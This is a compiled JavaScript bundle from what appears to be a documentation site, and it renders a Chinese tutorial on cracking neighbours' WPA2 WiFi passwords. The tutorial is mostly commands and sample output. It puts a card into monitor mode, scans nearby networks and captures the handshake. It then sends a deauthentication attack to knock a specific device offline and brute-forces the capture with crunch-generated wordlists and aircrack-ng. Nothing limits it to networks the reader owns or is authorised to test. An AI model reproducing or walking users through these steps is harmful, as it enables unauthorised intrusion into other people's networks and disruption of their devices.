(window.webpackJsonp=window.webpackJsonp||[]).push([[30],{541:function(a,n,i){"use strict";i.r(n);var r=i(38),c=Object(r.a)({},(function(){var a=this,n=a.$createElement,i=a._self._c||n;return i("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[i("h2",{attrs:{id:"wifi密码"}},[i("a",{staticClass:"header-anchor",attrs:{href:"#wifi密码"}},[a._v("#")]),a._v(" wifi密码")]),a._v(" "),i("ol",[i("li",[i("p",[a._v("sudo -i")])]),a._v(" "),i("li",[i("p",[a._v("ifconfig")])]),a._v(" "),i("li",[i("p",[a._v("airmon-ng")])]),a._v(" "),i("li",[i("p",[a._v("airmon-ng start wlan0  发起监听网卡")])]),a._v(" "),i("li",[i("p",[a._v("ifconfig")])]),a._v(" "),i("li",[i("p",[a._v("airodump-ng wlan0mon 扫描周边wifi（wlan0mon是上一步ifconfig查询出来的网卡名）\n扫描出来的大概信息为 ：\nBSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID"),i("br"),a._v("\n08:60:83:A4:88:90  -58        3      147   20   3  130   WPA2 CCMP   PSK  CMCC-2EFH"),i("br"),a._v("\nEC:6C:B5:98:CA:40  -61        9       11    0   9  130   WPA2 CCMP   PSK  CMCC-208\n扫描出来的wifi信息 原来抓包 ，需要用到bssid（mac地址）  和 ch （频段）")])]),a._v(" "),i("li",[i("p",[a._v("抓包到handshake （被动的抓包模式 需要有用户上下线 ，所以我们使用另外更快的方法,可以促进它加速完成）\nairodump-ng -c 9 --bssid EC:6C:B5:98:CA:40  -w /home/kail/桌面/handshake wlan0mon")])]),a._v(" "),i("li",[i("p",[a._v("使用ack死亡攻击 踢下线 ，WiFi有自动登入功能，重新登录我们就可以立马抓到包了")])])]),a._v(" "),i("p",[a._v("aireplay-ng -0 10 -a EC:6C:B5:98:CA:40 -c 30:03:C8:3B:D7:C7 wlan0mon")]),a._v(" "),i("div",{staticClass:"language- extra-class"},[i("pre",[i("code",[a._v("0 代表下线; 10 代表攻击10次 ; -a后面是mac地址 ;-c后面是我们上一步抓包的STATION ，代表设备\n")])])]),i("p",[a._v("当抓包的终端头部出现 ...WPA handshake: EC:6C:B5:98:CA:40...  代表我们抓包成功了！\n会在桌面上生成4-5个文件 ， 我们主要用到.cap文件\n9.  准备字典  使用crunch工具进行 字典生成  优化规则\n/usr/share/crunch/ 找到定义好的字符集")]),a._v(" "),i("ol",[i("li",[a._v("28.lalpha-numeric                = [abcdefghijklmnopqrstuvwxyz0123456789]")]),a._v(" "),i("li",[a._v("40.mixalpha-numeric-all       = [abcdefghijklmnopqrstuvwxypqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]")])]),a._v(" "),i("p",[a._v("执行生成命令 :\ncrunch 8 8 /usr/share/crunch/charset.lst lalpha-numeric\n根据字符集生成密码 -o START 路径.txt 可以输出文件\n表示 生成最短8个 最长8个 指定字符集规则的文件\ncrunch 8 8 /usr/share/crunch/charset.lst mixalpha-numeric-all")]),a._v(" "),i("p",[a._v("crunch 8 8 /usr/share/crunch/charset.lst mixalpha-numeric-all -b 1gb -o START /home/kail/\n//生成指定字符串\ncrunch 8 8 abcdefghijklmnopqrstuvwxypqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -b 1gb -o START /home/kail/")]),a._v(" "),i("p",[a._v("crunch 8 8 abcdefghijklmnopqrstuvwxypqrstuvwxyz0123456789 -d 1 -b 1gb -o START /home/kail/")]),a._v(" "),i("p",[a._v("crunch 8 8 0123456789 -b 1gb -o START /home/kail/")]),a._v(" "),i("ol",{attrs:{start:"10"}},[i("li",[a._v("暴力破解")])]),a._v(" "),i("p",[a._v("跑本地字典 ：\naircrack-ng -w /home/kail/passwords-1.txt -b EC:6C:B5:98:CA:40 /home/kail/桌面/handshake-0*.cap")]),a._v(" "),i("p",[a._v("aircrack-ng -w /root/00000000-99999999.txt -b EC:6C:B5:98:CA:40 /home/kail/桌面/handshake-0*.cap\n跑生成的字典 ：")]),a._v(" "),i("div",{staticClass:"language- extra-class"},[i("pre",[i("code",[a._v("-w 后面是我们放在桌面的字典  -b后面是BSSID地址  以及我们抓包的文件地址")])])])])}),[],!1,null,null,null);n.default=c.exports}}]);